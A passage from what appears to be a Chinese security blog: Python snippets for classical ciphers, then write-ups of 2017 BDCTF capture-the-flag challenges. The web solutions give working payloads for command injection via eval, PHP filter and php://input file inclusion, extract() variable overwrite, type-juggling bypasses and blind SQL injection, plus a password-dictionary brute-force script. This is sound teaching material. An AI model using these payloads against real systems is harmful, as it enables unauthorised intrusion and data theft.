ord(\u0026#39;a\u0026#39;) + offset) % cycle + ord(\u0026#39;a\u0026#39;)) elif \u0026#39;A\u0026#39; \u0026lt;= i \u0026lt;= \u0026#39;Z\u0026#39;: r += chr((ord(i) - ord(\u0026#39;A\u0026#39;) + offset) % cycle + ord(\u0026#39;A\u0026#39;)) else: r += i res.append([offset, r]) return res # test print caesar(\u0026#39;h3llo\u0026#39;) #[ [0, \u0026#39;h3llo\u0026#39;], [1, \u0026#39;i3mmp\u0026#39;], [2, \u0026#39;j3nnq\u0026#39;], [3, \u0026#39;k3oor\u0026#39;], [4, \u0026#39;l3pps\u0026#39;], [5, \u0026#39;m3qqt\u0026#39;], [6, \u0026#39;n3rru\u0026#39;], [7, \u0026#39;o3ssv\u0026#39;], # [8, \u0026#39;p3ttw\u0026#39;], [9, \u0026#39;q3uux\u0026#39;], [10, \u0026#39;r3vvy\u0026#39;], [11, \u0026#39;s3wwz\u0026#39;], [12, \u0026#39;t3xxa\u0026#39;], [13, \u0026#39;u3yyb\u0026#39;], [14, \u0026#39;v3zzc\u0026#39;], # [15, \u0026#39;w3aad\u0026#39;], [16, \u0026#39;x3bbe\u0026#39;], [17, \u0026#39;y3ccf\u0026#39;], [18, \u0026#39;z3ddg\u0026#39;], [19, \u0026#39;a3eeh\u0026#39;], [20, \u0026#39;b3ffi\u0026#39;], [21, \u0026#39;c3ggj\u0026#39;], # [22, \u0026#39;d3hhk\u0026#39;], [23, \u0026#39;e3iil\u0026#39;], [24, \u0026#39;f3jjm\u0026#39;], [25, \u0026#39;g3kkn\u0026#39;]] 莫尔斯电码加解密 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 # by https://findneo.github.io/ import re def morse(s): morseChart = [\u0026#39;.-\u0026#39;, \u0026#39;-...\u0026#39;, \u0026#39;-.-.\u0026#39;, \u0026#39;-..\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;..-.\u0026#39;, \u0026#39;--.\u0026#39;, \u0026#39;....\u0026#39;, \u0026#39;..\u0026#39;, \u0026#39;.---\u0026#39;, \u0026#39;-.-\u0026#39;, \u0026#39;.-..\u0026#39;, \u0026#39;--\u0026#39;, \u0026#39;-.\u0026#39;, \u0026#39;---\u0026#39;, \u0026#39;.--.\u0026#39;, \u0026#39;--.-\u0026#39;, \u0026#39;.-.\u0026#39;, \u0026#39;...\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;..-\u0026#39;, \u0026#39;...-\u0026#39;, \u0026#39;.--\u0026#39;, \u0026#39;-..-\u0026#39;, \u0026#39;-.--\u0026#39;, \u0026#39;--..\u0026#39;, \u0026#39;-----\u0026#39;, \u0026#39;.----\u0026#39;, \u0026#39;..---\u0026#39;, \u0026#39;...--\u0026#39;, \u0026#39;....-\u0026#39;, \u0026#39;.....\u0026#39;, \u0026#39;-....\u0026#39;, \u0026#39;--...\u0026#39;, \u0026#39;---..\u0026#39;, \u0026#39;----.\u0026#39;, \u0026#39;.-.-.-\u0026#39;, \u0026#39;--..--\u0026#39;, \u0026#39;..--..\u0026#39;, \u0026#39;-....-\u0026#39;, \u0026#39;.----.\u0026#39;, \u0026#39;---...\u0026#39;, \u0026#39;.-..-.\u0026#39;, \u0026#39;-..-.\u0026#39;, \u0026#39;.--.-.\u0026#39;, \u0026#39;-.-.-.\u0026#39;, \u0026#39;-...-\u0026#39;, \u0026#39;-.-.--\u0026#39;, \u0026#39;..--.-\u0026#39;, \u0026#39;-.--.\u0026#39;, \u0026#39;-.--.-\u0026#39;, \u0026#39;...-..-\u0026#39;, \u0026#39;.-...\u0026#39;, \u0026#39;.-.-.\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;*\u0026#39; ] alphaChart = [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;g\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;j\u0026#39;, \u0026#39;k\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;q\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;u\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;w\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;z\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;,\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;-\u0026#39;, \u0026#34;\u0026#39;\u0026#34;, \u0026#39;:\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;@\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;!\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;(\u0026#39;, \u0026#39;)\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;#\u0026#39; ] # or as a dict -\u0026gt; {c[1][i]: c[0][i] for i in xrange(len(c[0]))} c = [morseChart, alphaChart] s = s.lower() # replace characters not in alphaChart with \u0026#39;#\u0026#39; ,which shall be \u0026#39;*\u0026#39; in # encoded string s = re.sub(\u0026#39;[^a-z0-9.,?\\-\\\u0026#39;:\u0026#34;/@;=!_()$\u0026amp;+ ]\u0026#39;, \u0026#39;#\u0026#39;, s) # for convenience sake, I choose not to deal with space in morse. s = re.sub(\u0026#39;\\s+\u0026#39;, \u0026#39; \u0026#39;, s) m = 1 # default to decode # if mot mismatch that condition,we are to encode. if not re.match(\u0026#39;[^-._ ]\u0026#39;, s): # occasionally we meet [ ._]+ instead of [ .-]+ s = s.replace(\u0026#39;_\u0026#39;, \u0026#39;-\u0026#39;) s = re.split(\u0026#39; \u0026#39;, s) m = 0 # we are to encode by morse r = [] # list().extend(foo) returns None so we use \u0026#39;or r\u0026#39; return (m * \u0026#39; \u0026#39;).join(r.extend([c[1 - m][c[m].index(i)] for i in s]) or r) # test print morse(\u0026#39;Hello word,2017!\u0026#39;) print morse(\u0026#39;.... . .-.. .-.. --- .-- --- .-. -.. --..-- ..--- ----- .---- --... -.-.--\u0026#39;) base64混合编码 1 2 3 4 5 6 7 8 9 10 11 from base64 import * import random def baseRandomEncode(s, depth=3): for i in xrange(depth): s = random.choice([b64encode, b32encode, b16encode])(s) return s print baseRandomEncode(\u0026#39;hello world!\u0026#39;) # test base64混合解码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # by https://findneo.github.io/ from base64 import * import re res = [] # repattern is a self-defining item. # In CTF games,flag often comes as a printable string containing \u0026#39;{\u0026#39; and \u0026#39;}\u0026#39;. repattern = \u0026#34;[ -~]*{[ -~]*}[ -~]*|[ -~]*}[ -~]*{[ -~]*\u0026#34; def basefuzzDecode(s): global res for f in [b64decode, b32decode, b16decode]: try: t = f(s) if re.match(repattern, t): res.append(t) return 0 else: basefuzzDecode(t) except: pass return res print basefuzzDecode(baseRandomEncode(\u0026#39;flag{hello ctf!}\u0026#39;)) # test ","permalink":"https://ret2neo.cn/post/171015pythonsnippets/","summary":"栅栏密码加解密 单行版本 1 2 railFence = lambda s: [[i, \u0026#39;\u0026#39;.join([s[k * i + j] for j in range(i) for k in range(len(s) / i)])] for i in range(1, len(s)) if not len(s) % i] print railFence(\u0026#39;hello world , 2017 ! \u0026#39;) 正常版本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def railFence(s): ll = len(s) res = dict() for i in range(1, ll): r = \u0026#39;\u0026#39; if ll % i == 0: for j in range(i): for k in range(ll / i): r += s[k * i + j] res[i] = r return res # test print railFence(\u0026#39;hello world , 2017 !","title":"用python实现几种常见简单加密"},{"content":"2017/10/14 http://miac.cug.edu.cn/\nhttp://www.yogeit.com/\nhttps://www.bdctf.online/\nCrypto 贝斯的一家 1 UjFrelJFMVJXbGRIUlRORVQwNHlRMGRaTTBSTlVWcFVSMUV6UkU5T1MwZEhUVmxVUzFKU1ZVZEpXbFJKVGxwVVIxa3lWRXRTVWxkSVJWcFVSMDVMUjBkVk0wUkhUVnBZUjBrelZGTk9TMGRIVFRSVVRWSlNWMGxaTTBSSlRqSkY= 依次base64、base64、base32、base16解码。 flag{fl4g_1_B4se_i3_V3ry_9ood}\n颜文字 1 ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [\u0026#39;_\u0026#39;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: \u0026#39;_\u0026#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +\u0026#39;_\u0026#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ \u0026#39;_\u0026#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +\u0026#39;_\u0026#39;)[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +\u0026#39;_\u0026#39;) [c^_^o];(ﾟДﾟ) [\u0026#39;c\u0026#39;] = ((ﾟДﾟ)+\u0026#39;_\u0026#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [\u0026#39;o\u0026#39;] = ((ﾟДﾟ)+\u0026#39;_\u0026#39;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [\u0026#39;c\u0026#39;]+(ﾟДﾟ) [\u0026#39;o\u0026#39;]+(ﾟωﾟﾉ +\u0026#39;_\u0026#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +\u0026#39;_\u0026#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +\u0026#39;_\u0026#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +\u0026#39;_\u0026#39;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +\u0026#39;_\u0026#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [\u0026#39;c\u0026#39;]+((ﾟДﾟ)+\u0026#39;_\u0026#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [\u0026#39;o\u0026#39;]+((ﾟｰﾟ==3) +\u0026#39;_\u0026#39;) [ﾟΘﾟ];(ﾟДﾟ) [\u0026#39;_\u0026#39;] =(o^_^o) [ﾟoﾟ][ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +\u0026#39;_\u0026#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+\u0026#39;_\u0026#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +\u0026#39;_\u0026#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +\u0026#39;_\u0026#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +\u0026#39;_\u0026#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=\u0026#39;\\\\\u0026#39;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +\u0026#39;_\u0026#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=\u0026#39;\\\u0026#34;\u0026#39;;(ﾟДﾟ) [\u0026#39;_\u0026#39;] ( (ﾟДﾟ) [\u0026#39;_\u0026#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (\u0026#39;_\u0026#39;); aaencode ，在线解混淆 或在 chrome 的console里直接运行即可。其他还有jjencode,ppencode,rrencode等。\n1 alert(\u0026#34;flag{aaencode_f14g_h4h4h4}\u0026#34;) 你猜我像啥 1 Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4= 1 2 3 4 5 6 7 8 9 10 11 12 13 from base64 import * s=\u0026#39;Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4=\u0026#39; b64decode(s.replace(\u0026#39;\\n\u0026#39;,\u0026#39;\u0026#39;)) #\uu0026#39; #摩斯密码的解密(https://morsecode.scphillips.com/translator.html) #=\u0026gt;125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115 #ASCII码转字符\t}3_e_0_eutylxrnhl33{ns t=\u0026#39;125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115\u0026#39; tt=\u0026#39;\u0026#39;.join(map(lambda x:chr(int(x)),t.split(\u0026#39;-\u0026#39;))) #字符串反转 sn{33lhnrxlytue_0_e_3} rtt=tt[::-1] #栅栏密码的解密\tsynt{u3e3_l0h_ner_x3l} #凯撒密码解密 flag{h3r3_y0u_are_k3y} 2017/10/23 WEB WEB签到 签到，格式bdctf{xxxxx} http://2a8a372c90b9c52b54ac9f85234f6f20.yogeit.com:8080\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php highlight_file(\u0026#39;flag.php\u0026#39;); $_GET[\u0026#39;id\u0026#39;] = urldecode($_GET[\u0026#39;id\u0026#39;]); $flag = \u0026#39;bdctf{xxxxxxxxxxxxxxxxxx}\u0026#39;; if (isset($_GET[\u0026#39;user\u0026#39;]) and isset($_POST[\u0026#39;pass\u0026#39;])) { if ($_GET[\u0026#39;user\u0026#39;] == $_POST[\u0026#39;pass\u0026#39;]) print \u0026#39;pass can not be user.\u0026#39;; else if (sha1($_GET[\u0026#39;user\u0026#39;]) === sha1($_POST[\u0026#39;pass\u0026#39;])\u0026amp;($_GET[\u0026#39;id\u0026#39;]==\u0026#39;margin\u0026#39;)) die(\u0026#39;Flag: \u0026#39;.$flag); else print \u0026#39;sorry!\u0026#39;; } ?\u0026gt; 对数组进行哈希会返回null，所以传进去两个数组即可。Flag: bdctf{welcomeBDCTF2017}\n命令注入 格式是flag{xxxx} http://c3f534c3e77ef68bda72e406337023fb.yogeit.com:8080\n1 2 3 4 5 6 \u0026lt;?php include \u0026#34;flag.php\u0026#34;; error_reporting(0); show_source(__FILE__); $a = @$_REQUEST[\u0026#39;hello\u0026#39;]; eval(\u0026#34;var_dump($a);\u0026#34;); 直接执行系统命令，system('cat flag.php') 。得到flag为flag{93odcGA47rSRFDG}\n这不仅仅是WEB 格式bdctf{xxxxx} http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080\n存在文件读取：\n1 2 3 4 5 6 7 8 9 10 11 //index.php //view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=index.php \u0026lt;?php $file = $_GET[\u0026#34;page\u0026#34;]; if( isset( $file ) ) include( $file ); else { header( \u0026#39;Location:?page=include.php\u0026#39; ); exit; } ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 //include.php //view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=include.php \u0026lt;?php echo\u0026#39; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;font size=\u0026#34;20\u0026#34;\u0026gt; \u0026lt;b\u0026gt;File Include\u0026lt;/b\u0026gt; \u0026lt;/font\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;br\u0026gt; \u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;photo.jpg\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;font color=\u0026#34;white\u0026#34;\u0026gt;文件格式为文本格式\u0026lt;/font\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;\u0026#39; ?\u0026gt; 访问不了惹。\nMISC MISC签到题 R1kzRE1RWldHRTNET04yQ0dZWkRHTVpXR0kzRElNWldHTVlUR01CVEdJWlRHTlJVR01ZVEdNUlRIRTNETU1aWkdZMlRHTVpUSEUzREVNWlVHWVlUR01SVEdZM0RFTVpaR000RE1NWlRHQTNETU1aVEdNM0RHTlJYSVE9PT09PT0=\n先base64解码，再base32解码，然后十六进制转ASCII码，得到flag为flag{b3bd61023d129f9e39b4a26b98c0f366}\n常规杂项 在文件末尾发现提示Password:Bluedon[0-9]{8} ，写python脚本生成字典，binwalk -e 提取出压缩包，使用ziperello爆破得到密码为Bluedon47632601，解压后还是一个压缩包，但应该是伪加密，用notepad++打开即可看到flag为flag{Aha!_Y0u_9Ot_i7}。\n队友使用了ARCHPR掩码爆破，方便很多。\n1 2 3 4 5 6 7 8 import itertools s0 = \u0026#39;Bluedon\u0026#39; p = \u0026#39;0123456789\u0026#39; f = open(\u0026#39;normalpass.txt\u0026#39;, \u0026#39;w+\u0026#39;) passwd = \u0026#39;\u0026#39; for i in itertools.product(p, p, p, p, p, p, p, p): passwd = s0 + \u0026#39;\u0026#39;.join(i) f.write(passwd) 就在眼前 就在眼前 恩，如题。格式BDCTF{xxxxx}\nflag=E5=80=BC=E5=B0=B1=E5=9C=A8=E6=AD=A4=E6=96=87=E6=A1=A3=E4=B8=AD=EF=BC=8C=E5=B9=B6=E4=B8=94=E4=BD=BF=E7=94=A8=E4=BA=86=E6=96=87=E6=9C=AC=E9=9A=90=E8=97=8F=E6=8A=8A=E8=87=AA=E5=B7=B1=E9=9A=90=E8=97=8F=E8=B5=B7=E6=9D=A5=E4=BA=86=E3=80=82=0A=E6=98=BE=E7=A4=BA=E5=87=BA=E9=9A=90=E8=97=8F=E6=96=87=E6=9C=AC=E5=8D=B3=E5=8F=AF\n使用了Quoted Printable encode，在线解码 可知隐藏了flag，让其显示即可。BDCTF{Y0u_4Re_5ucCe5SFul}\n队友将文件另存为XML，打开也可见flag。\n2017/10/30 web 签到题 更大的数，格式bdctf{xxx} http://1ccb637956167fe75634730d3d5e9d71.yogeit.com:8080\n修改表单长度限制。bdctf{s0m2thing_ju8t_1ik2_thi8}\n简单的题 格式flag{xxxx} http://f944ecfceaddb11ec591f23738496e52.yogeit.com:8080\n1 2 3 4 5 6 if(isset($_POST[\u0026#39;password\u0026#39;])) { if (strcmp($_POST[\u0026#39;password\u0026#39;], $flag) == 0) die($flag); else echo \u0026#34;密码不正确！\u0026#34;; } post一个数组 password[]= 即可。flag{Y0u_4re_G3t_FLAG_452}\nWEB100-2 提示是?hint，格式是flag{xxxx} http://78a06773a04246464d8eeadd2cdf28af.yogeit.com:8080\n根据提示访问http://127.0.0.1/ctfoj/bdctf.php?hint 得到源码。 带上Cookie: BDCTF=s:21:\u0026quot;BDCTF:www.bluedon.com\u0026quot;%3b 即可得到flag{pBXeeZdOkG1QTP1} 。cookie中的分号要url编码一下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php error_reporting(0); $KEY=\u0026#39;BDCTF:www.bluedon.com\u0026#39;; include_once(\u0026#34;flag.php\u0026#34;); $cookie = $_COOKIE[\u0026#39;BDCTF\u0026#39;]; if(isset($_GET[\u0026#39;hint\u0026#39;])){ show_source(__FILE__); } elseif (unserialize($cookie) === \u0026#34;$KEY\u0026#34;) { echo \u0026#34;$flag\u0026#34;; } else { foo 蓝盾管理员 you are not bd-admin，格式bdctf{xxx} http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080\n访问view-source:http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=flag.php\u0026amp;user=php://input 同时post the user is bdadmin 得到bd-admin!\u0026lt;br\u0026gt;PD9waHAgIA0KLy9iZGN0ZntMZmlfQW5EX01vcmV9ICANCj8+ ，解码后得到bdctf{Lfi_AnD_More} 1 2 3 4 5 6 7 8 9 10 11 12 //index.php \u0026lt;!-- @$user = $_GET[\u0026#34;user\u0026#34;]; @$file = $_GET[\u0026#34;file\u0026#34;]; if(isset($user)\u0026amp;\u0026amp;(file_get_contents($user,\u0026#39;r\u0026#39;)===\u0026#34;the user is bdadmin\u0026#34;)){ echo \u0026#34;hello bd-admin!\u0026lt;br\u0026gt;\u0026#34;; include($file); //flag.php }else{ echo \u0026#34;you are not bd-admin ! \u0026#34;; } --\u0026gt; 送大礼 格式bdctf{xxx} http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080\n访问 http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/flag.txt 有jsfuck，解开 后内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 extract($_GET); if(isset($bdctf)) { $content=trim(file_get_contents($flag)); if($bdctf==$content) { echo\u0026#39;bdctf{**********}\u0026#39;; } else { echo\u0026#39;这不是蓝盾的密码啊\u0026#39;; } } 访问 http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/?bdctf=foo\u0026amp;flag=php://input 同时post foo 得到bdctf{UCCdlsZyVe} 。\n火星撞地球 flag{1q2w3e4r} 密码就是答案，格式flag{xxxx} http://eef6f0186546043da56bf4c7f7e6d3ca.yogeit.com:8080\n获取当前数据库名member\n1 name=admin%27%20and%20(ASCII(MID((database()),6,1)))=114%23\u0026amp;password=%27%20or%201\u0026amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 当前数据库只有一个表\n1 